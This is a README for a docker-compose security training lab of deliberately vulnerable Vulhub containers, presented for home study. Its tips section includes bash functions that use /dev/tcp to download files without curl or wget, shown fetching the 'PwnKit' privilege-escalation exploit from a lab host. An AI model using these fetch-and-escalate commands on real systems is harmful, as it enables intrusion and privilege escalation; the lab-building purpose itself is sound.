## Intro
This docker-compose setup allows you to easily spin up a security testing/research environment.

This was done for our presentation "Do It Yourself: Building a Security Lab At Home" in January 2021.

The main purpose is to create a separate network and containers that can be referenced by name.

This also allows you to have multiple containers listening on the same port to avoid confusing port mappings.

## Usage

Simply clone this repository and run:

``
docker-compose up -d
``

Be certain to add the following to your /etc/hosts file:

```
# Vulhub lab
10.1.1.5        shellshock
10.1.1.6        jenkins
10.1.1.7        phpmyadmin
10.1.1.8        mysql
10.1.1.9        telnetserver
10.1.1.10       kali
10.1.1.11       solr-log4j

```

Modify for your own needs! Thanks to Vulhub: https://github.com/vulhub/vulhub

## Tips

To use bash to retrieve a file via HTTP create this function (just copy and paste this into a terminal):

```
_get ()
{
  IFS=/ read proto z host query <<< "$1"
  exec 3< /dev/tcp/$host/80
  {
    echo GET /$query HTTP/1.1
    echo connection: close
    echo host: $host
    echo
  } >&3 
  sed '1,/^$/d' <&3 > $(basename $1)
}

```

For binary files:

```
__curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

Then you can use it like this:

```$ _get http://10.1.1.14/PwnKit```

```$ __curl http://10.1.1.14/PwnKit```
